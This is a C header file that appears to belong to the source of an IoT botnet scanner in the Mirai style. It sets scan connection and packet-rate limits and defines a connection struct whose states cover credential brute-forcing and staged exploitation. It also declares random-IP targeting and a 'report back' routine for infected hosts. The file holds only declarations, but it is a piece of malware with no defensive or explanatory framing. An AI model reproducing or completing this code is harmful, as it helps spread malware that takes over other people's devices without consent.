#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define scanner_SCANNER_MAX_CONNS 512
#define scanner_SCANNER_RAW_PPS 1440
#else
#define scanner_SCANNER_MAX_CONNS 550
#define scanner_SCANNER_RAW_PPS 240
#endif
#ifdef X86_64
#define scanner_SCANNER_RDBUF_SIZE 1024
#define scanner_SCANNER_HACK_DRAIN 64
#else
#define scanner_SCANNER_RDBUF_SIZE 256
#define scanner_SCANNER_HACK_DRAIN 64
#endif

struct scanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        scanner_SC_CLOSED,
        scanner_SC_CONNECTING,
        scanner_SC_GET_CREDENTIALS,
        scanner_SC_EXPLOIT_STAGE2,
        scanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[scanner_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560], payload_buf2[2560];
    int credential_index;
    char address[100];
};

void scanner_init();
void scanner_kill(void);

static void scanner_setup_connection(struct scanner_scanner_connection *);
static ipv4_t get_random_ip(void);
static void init_report_back(char *address, int port);
